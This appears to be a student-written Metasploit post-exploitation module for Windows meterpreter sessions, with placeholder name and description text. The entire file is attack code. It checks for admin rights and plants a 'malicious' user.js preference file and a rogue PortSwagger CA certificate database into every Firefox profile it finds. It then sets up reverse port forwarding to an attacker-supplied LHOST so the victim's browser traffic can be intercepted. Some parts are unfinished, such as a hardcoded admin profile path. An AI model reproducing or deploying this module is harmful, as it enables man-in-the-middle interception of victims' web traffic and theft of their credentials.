##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::File
  include Msf::Post::Common

    def initialize(info={})
        super(update_info(info,
            'Name'          => '[Platform] [Module Category] [Software] [Function]',
            'Description'   => %q{
              Say something that the user might want to know.
            },
            'License'       => MSF_LICENSE,
            'Author'        => [ 'Hyun-Bum Yang' ],
            'Platform'      => [ 'win' ],
            'SessionTypes'  => [ 'meterpreter']
        ))

        register_options(
            [
                OptAddress.new('LHOST', [true, 'Address which to connect back to.']),
                OptPort.new('LPORT', [true, 'Port to receive the connection to.'])
            ])
    end

    def upload(directory)
        # Attempt to write the user.js file
        print_status("Uploading a malicious preference file at #{directory}")
        res = upload_file("c:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{directory}\\user.js", '/root/itp325/browser-pivot/user.js')
        if res.nil?
            print_error "Upload failed"
        else
            print_good "Upload successful"
        end

        # Upload PortSwagger CA to victim
        print_status("Uploading malicious Certificate at #{directory}")
        res = upload_file("c:\\Users\\admin\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\#{directory}\\cert9.db", '/root/itp325/browser-pivot/cert9.db')
        if res.nil?
            print_error "Upload failed"
        else
            print_good "Upload successful"
        end
        print_status(" ")
    end

    def find_users()
        directory = 'c:\Users\\'
        dirs = dir(directory)
        return dirs
    end

    def run
        # Main method
        if is_in_admin_group?
            print_good "I am Admin!"

            output = pwd

            if output.nil? || output.empty?
                print_error "failed"
                return
            else
                print_good "#{output}"
            end

        else
            print_error "I am not Admin!"
            return
        end

        # Get all users in Users directory except "Public"
        users = find_users()
        for u in users
            if u != "." and u != ".." and u != "Public"
                # Find all the Firefox profiles
                directory = "c:\\Users\\#{u}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
                print_status(directory)
                if directory?(directory)
                    dirs = dir(directory)
                    if dirs.nil?
                           print_error "Something went wrong"
                    else
                           dirs.each {|a| print_status a}
                    end

                    for i in dirs
                        if i != "." and i != ".."
                            upload(i)
                            # Find a way to forward the response back to the victim
                        end
                    end
                end
            end
        end

        # Attempt to open port forwarding
        host = datastore['LHOST']
        port = datastore['LPORT']
        print_status("Starting reverse port forwarding")
        session.run_cmd("portfwd add -L #{host} -R -l #{port} -p 8080 -r 127.0.0.1")

    end

end

